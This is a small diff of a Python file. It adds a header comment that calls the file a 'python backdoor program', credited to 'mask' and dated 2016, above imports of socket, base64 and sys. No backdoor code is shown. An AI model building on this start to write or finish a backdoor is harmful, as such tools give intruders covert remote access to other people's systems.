@@ -1,4 +1,9 @@
 #!coding=utf-8
+'''
+python后门程序
+			--by mask 2016.4.12
+
+'''
 import socket
 import base64
 import sys
